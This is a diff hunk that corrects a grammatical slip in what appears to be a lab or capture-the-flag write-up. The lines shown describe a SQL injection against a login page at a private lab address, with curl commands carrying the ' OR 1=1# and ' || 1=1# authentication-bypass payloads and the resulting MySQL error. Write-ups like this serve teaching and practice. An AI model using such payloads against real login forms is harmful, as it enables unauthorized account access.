@@ -36,7 +36,7 @@ So we try doing the usual ' OR 1=1# and we get nothing. Checking the error messa
 curl --data "email=admin&password=' OR 1=1#" http://192.168.56.101/login.php
 There was an error running the query [You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '11#'' at line 1]
 ```
-So we replace the OR with || instead and it works we are get logged in as the user john.
+So we replace the OR with || instead and it works we get logged in as the user john.
 ```
 curl --data "email=admin&password=' || 1=1#" http://192.168.56.101/login.php
 ```
